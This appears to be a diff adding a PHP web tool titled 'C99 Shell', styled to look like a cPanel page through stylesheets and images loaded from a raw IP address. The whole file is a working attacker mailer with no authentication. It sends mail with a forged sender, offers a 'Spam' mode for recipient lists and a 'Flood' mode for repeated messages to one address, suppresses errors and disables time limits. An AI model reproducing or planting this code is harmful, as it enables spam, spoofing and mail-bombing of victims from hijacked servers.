@@ -1,0 +1,68 @@
+﻿<!Doctype html>
+<head>
+<body>
+<html>
+<link rel="stylesheet" href="http://212.1.210.211:2082/cPanel_magic_revision_1366088669/unprotected/cpanel/style_v2_optimized.css" type="text/css" media="screen">
+<center>
+<img class="background-image" src="http://212.1.210.211:2082/cPanel_magic_revision_1351573544/unprotected/cpanel/images/login-whisp.png">
+<style type="text/css">
+
+</style>
+<center>Quote: <?php /*
+© friz - 8y4hmi3
+*/ ?>
+ <title>C99 Shell :D</title> <?php //
+error_reporting (0); if(!set_time_limit(0)) {
+$limit = false; } else {
+set_time_limit(0);
+ignore_user_abort(1);
+$limit = true; }
+
+$log = 'log.txt'; // Log file
+
+ini_set('max_execution_time', '0');
+?>
+set_time_limit(0) = <?php if($limit)echo('<font color=Green>On</font></center>');else
+echo('<font color=Red>Off</font> (Working time is limited with the current settings of the server)</center>');?><br> <?php 
+
+$ip = getenv('REMOTE_ADDR'); if($_GET['mail'] == '1' || $_GET['mail'] == '2' || $_GET['mail'] == '3') {
+
+$_POST['to'] = stripslashes($_POST['to']);
+$_POST['msg'] = stripslashes($_POST['msg']);
+$_POST['from'] = stripslashes($_POST['from']);
+$_POST['subject'] = stripslashes($_POST['subject']);
+if($_POST['to'] && $_POST['msg'] && $_POST['from'] && $_POST['tipe']) {
+$headers = "MIME-Version: 1.0\r\n";
+$headers .= "Content-type: text/".$_POST['tipe']."; charset=windows-1251\r\n";
+$headers .= "From: ".$_POST['from']."\n"; if($_GET['mail'] == '1') {
+mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); }
+elseif($_GET['mail'] == '2') {
+$_POST['to'] = explode("\n",$_POST['to']); foreach($_POST['to'] as $poluchatels) {
+mail($poluchatels, $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); } }
+elseif($_GET['mail'] == '3') { if(preg_match('/[0-9]+/',$_POST['kol'])) { for($i=0;$i<$_POST['kol'];$i++) {
+mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message');
+sleep(1); } } else {
+echo('Incorrect (or not entered) number of messages'); } }
+$f = fopen($log,'a');
+fwrite($f,'Message sent &'.$_POST['msg'].'& with subject "'.$_POST['subject'].'" for "'.$_POST['to'].'" from IP - "'.$ip."\"\r\n");
+fclose($f);
+echo('<center><b><font color="green">Message succesfully sent</font></b></center><br><div class="input-req-login"><a href="c99.php">Home</div></a></br>'); } else { ?> <form style="width:350px" method='post'> <?php if($_GET['mail'] == '1' || $_GET['mail'] == '3') {
+echo("<center>Receiver <input class='std_textbox' type='text'name='to'><br></center>"); } ?>
+<center>Sender <input class='std_textbox' type='text' name='from'><br></center>
+<center>Subject <input class='std_textbox' type='text' name='subject'><br><center> <?php if($_GET['mail'] == '3') {
+echo("<center><br>Amount of messages </br></center>");
+echo("<center><input class='std_textbox' type='text' name='kol'><br></center>"); } ?> <br>
+<center>htm -> <input type='radio' checked='checked' tabindex='1' name='tipe' value='html'> :: <input type='radio' name='tipe' value='plain'><- text<br></center> <?php if($_GET['mail'] == '2') {
+echo("Receivers<br><textarea name='to' rows='10' cols='30'>Insert a email here</textarea>"); } ?> <center><br>Message<br> <textarea name='msg' rows='10' cols='30'></textarea><br><br><input type='submit'> </form></center><br><div class="input-req-login"><a href="c99.php">Home</div></a><br><footer><div class="input-req-login">Copyright 2013&copy; AeonHack Syahmie II</div></footer> <?php } } else { ?><br>
+
+<center><button name="login" ><a href='<?php $_SERVER['PHP_SELF']?>?mail=1'>Send simple message</a></button><br></center>
+<center><button name="login"><a href='<?php $_SERVER['PHP_SELF']?>?mail=2'>Spam</a></button><br></center>
+<center><button name="login"><a href='<?php $_SERVER['PHP_SELF']?>?mail=3'>Flood</a></button><br></center>
+
+<center>
+<footer><div class="input-req-login">Copyright 2013&copy; AeonHack Syahmie II</div></footer>
+</center>
+</html>
+</body>
+</head>
+<?php }
